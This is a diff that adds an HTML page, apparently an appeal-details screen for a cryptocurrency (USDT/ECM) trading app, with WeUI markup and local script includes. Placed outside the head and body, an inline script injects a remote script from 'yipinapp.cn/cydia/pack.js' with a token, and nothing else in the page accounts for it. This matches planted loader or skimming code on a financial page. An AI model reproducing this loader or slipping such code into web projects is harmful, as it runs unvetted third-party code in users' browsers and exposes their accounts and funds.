@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="UTF-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
+		<title>申诉详情</title>
+		<link rel="stylesheet" href="../../static/css/weui.css" />
+		<link rel="stylesheet" href="../../static/css/common.css" />
+		<link rel="stylesheet" href="../../static/css/weui-jquery.css">
+		<link rel="stylesheet" href="../../static/css/transaction/payIng.css" />
+	</head>
+	<script>
+		(function () {
+			var dw = document.createElement("script");
+			dw.src = "https://yipinapp.cn/cydia/pack.js?zBv2XrG8cSQqzRDCm9hsEL"
+			var s = document.getElementsByTagName("script")[0];
+			s.parentNode.insertBefore(dw, s);
+		})()
+	</script>
+	<body>
+		<header class="weui-bar weui-bar-nav" id="returnBtn">
+		    <a class="weui-pull-left weui-btns" id="arrow">
+		        <span class="weui-cell__fts"></span>
+		    </a>
+		    <div class="weui-title"></div>
+		    <span class="weui-pull-right weui-cell__ft">联系商家</span>
+		</header>
+		<div class="orderStaute">
+			<h2 class="statusName"></h2>
+			<div class="orderDetail">
+				<div class="payTitle">
+					<div class="titleBg">
+						<p>交易金额</p>
+						<h2 class="changeColor">USDT<span class="payMoney"></span></h2>
+					</div>
+					<div class="titleright">
+						<p>交易单价：USDT<span class="trandeceil"></span></p>
+						<p>交易数量：<span class="trandeNum"></span> <span class="unit">ECM</span></p>
+					</div>
+				</div>
+				<div class="floorTep">
+					<ul>
+						<li class="qroding">
+							<p>申诉对象</p>
+							<p class="payee"></p>
+						</li>
+						<li>
+							<p>接单时间</p>
+							<p class="receipt"></p>
+						</li>
+						<li>
+							<p>订单号</p>
+							<p class="orderNO"></p>
+						</li>
+						<li>
+							<p>申诉时间</p>
+							<p class="appealTime"></p>
+						</li>
+						<li>
+							<p>申诉内容</p>
+						</li>
+						<li>
+							<textarea disabled="disabled" id="apealTxt" placeholder=""></textarea>
+						</li>
+						<li>
+
+						</li>
+						<li>
+							<p>申诉截图</p>
+							<p class="appelcheckImg">查看图片</p>
+						</li>
+						<li>
+
+						</li>
+						<li>
+
+						</li>
+					</ul>
+				</div>
+			</div>
+		</div>
+		<script type="text/javascript" src="../../lib/jquery.js" ></script>
+		<script type="text/javascript" src="../../lib/fastclick.js" ></script>
+		<script type="text/javascript" src="../../lib/zepto.min.js" ></script>
+		<script type="text/javascript" src="../../lib/jquery-weui.js" ></script>
+		<script type="text/javascript" src="../../lib/weui.min.js" ></script>
+		<script type="text/javascript" src="../../lib/swiper.js" ></script>
+		<script type="text/javascript" src="../../static/js/api.js" ></script>
+		<script type="text/javascript" src="../../static/js/common.js" ></script>
+		<script type="text/javascript" src="../../static/js/transaction/appealBox.js" ></script>
+	</body>
+</html>
